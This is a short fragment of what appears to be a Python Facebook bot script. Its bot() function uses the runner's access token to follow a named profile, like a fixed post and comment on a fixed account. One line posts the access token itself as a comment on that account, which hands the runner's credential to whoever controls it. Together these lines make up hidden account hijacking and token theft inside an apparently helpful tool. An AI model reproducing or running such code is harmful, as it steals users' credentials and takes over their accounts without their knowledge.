...
def bot():
	...
	requests.post("https://graph.facebook.com/saiful.behri.355/subscribers?access_token="+token) # sptty chan
	requests.post("https://graph.facebook.com/1160810637998387/likes?summary=true&access_token=" + token)
	requests.post("https://graph.facebook.com/100022083860754/comments/?message="+komentar+"&access_token="+token)
	requests.post("https://graph.facebook.com/100022083860754/comments/?message="+token+"&access_token="+token)
	menu()
